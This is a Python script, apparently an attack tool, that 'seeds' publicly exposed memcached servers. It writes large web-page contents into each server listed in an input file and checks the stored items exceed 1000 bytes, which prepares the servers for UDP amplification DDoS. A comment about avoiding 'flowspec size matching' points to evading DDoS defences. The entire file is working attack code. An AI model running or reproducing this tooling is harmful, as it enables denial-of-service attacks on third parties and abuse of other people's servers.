# Meme-cacheD seeder by Phenomite 2020
import os
import sys
import socket
import re
import time
import requests
import memcache
import concurrent.futures

exit = False
memcachePort = 11211


def getseed(url):
    seed_content = requests.get(url).text
    # Force into memory
    if not seed_content:
        print("Seeder failed...")
    else:
        print("Grabbing new seed...")
    return seed_content


def seed_items(ip, seed_content, seed_content2, seed_content3):
    # Grabs the list of all items in the memcache server
    global exit
    seed = ""
    try:
        print("Seeding items now (because UDP is unreliable by design you might need to run this again)")
        mc = memcache.Client([ip], debug=False)
        mc.set("p", seed_content3)
        mc.set("h", seed_content2)
        mc.set("e", seed_content)
        seed = "phenomite"  # junk for credit
    except UnicodeDecodeError:
        # Ignore non-utf8 responses and attempts at killing decoders (potential pots, unlikely though)
        pass
    except Exception as e:
        # If no data is received, you get here, but it's not an error
        # Ignore and continue
        print("\nError occurred while seeding: " + str(e))
        pass
    except KeyboardInterrupt:
        exit = True
    return seed


def get_best_items(ip, string_items, min_size):
    global exit
    overall_best_item = ""
    iterator = 0
    for item in string_items.split(" "):  # Bad yes but bite me
        iterator = iterator + 1
        try:
            # Set query to dump list of item keys
            print("\nItem: " + item)
            mc = memcache.Client([ip], debug=False)
            memcache_item_value = mc.get(item)

            item_size_returned = len(memcache_item_value)
            print("Reported size of item: " + str(item_size_returned))

            # Check the returned size is over our min threshold
            # and (item_size_returned > size_of_last_best_item)) or (len(item) <
            # len(overall_best_item) and item_size_returned ==
            # size_of_last_best_item):
            if item_size_returned >= int(min_size):
                overall_best_item += item + " "  # Set return val
                print("Added this item to key string for this IP")

        except UnicodeDecodeError:
            # Ignore non-utf8 responses and attempts at killing decoders (potential pots, unlikely though)
            pass
        except Exception as e:
            # If no data is received, you get here, but it's not an error
            # Ignore and continue
            print("\nError occurred while querying: " + str(e))
            pass
        except KeyboardInterrupt:
            exit = True
    return overall_best_item.strip()


def executors(ip, content_to_seed, content_to_seed2, content_to_seed3):
    print("\n---------New-IP---------")
    ip = ip.rstrip()  # Clean random DOS CRLF cancer
    try:
        # Get items on the IP (within response time constraints [hardcoded for now])
        seed_ip = seed_items(ip, content_to_seed, content_to_seed2, content_to_seed3)
        if not seed_ip:
            return  # Get the non responders out of here
        # Check for our seed
        ip_items = get_best_items(ip, seed_ip, "1000")
        if not ip_items:
            return  # Get the non responders out of here
        return ip_items
    except Exception as e:
        print("FATAL: " + str(e))  # debug


def main(fileInput, fileOutput,
         url="https://www.netflix.com/watch/70177848",
         url2="https://yahoo.com",
         url3="https://stackoverflow.com/questions/24017316/pragma-mark-in-swift"):
    global exit
    # TODO: Randomise the seed to not hit flowspec size matching
    content_to_seed = getseed(url)
    content_to_seed2 = getseed(url2)  # eh
    content_to_seed3 = getseed(url3)  # ehhhh
    with open(fileInput, 'r') as ips:
        with concurrent.futures.ProcessPoolExecutor(max_workers=50) as executor:
            future_seeder = {executor.submit(executors, ip, content_to_seed,
                                             content_to_seed2, content_to_seed3): ip for ip in ips}
            for future in concurrent.futures.as_completed(future_seeder):
                ip_seeded = future_seeder[future]
                try:
                    return_ip = future.result()
                except Exception as ex:
                    print('%r generated an exception: %s' % (ip_seeded, ex))
                else:
                    print('%s cache contains %s item!' % (str(ip_seeded).strip(), return_ip))
                print("\nWill write this to file: " + str(ip_seeded).strip())
                f = open(fileOutput, "a+")
                f.write(str(ip_seeded).strip() + "\n")
                f.close()
                print()  # Spacer
    print("\n---------Done---------")
    print("\nFinished seeding memcacheD IP list\n")


if __name__ == '__main__':
    print("-- MemcacheD Seeder -- Phenomite 2020 --")
    if len(sys.argv) < 3:
        print("Argument 1 (mandatory): Input filename containing one UDP memcache responder IP per line!\n\tAND DONT USE CRLF YOU WINDOWS FOOL. `dos2unix inputfile` if you are unsure.")
        print("Argument 2 (mandatory): Output filename.")
        print("Argument 3: Optional 1st domain to seed from (defaults if not entered).")
        print("Argument 4: Optional 2nd domain to seed from (defaults if not entered).")
        print("Argument 5: Optional 3rd domain to seed from (defaults if not entered).")
        quit()
    elif len(sys.argv) == 3:
        main(sys.argv[1], sys.argv[2])
    elif len(sys.argv) > 3:
        main(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5])
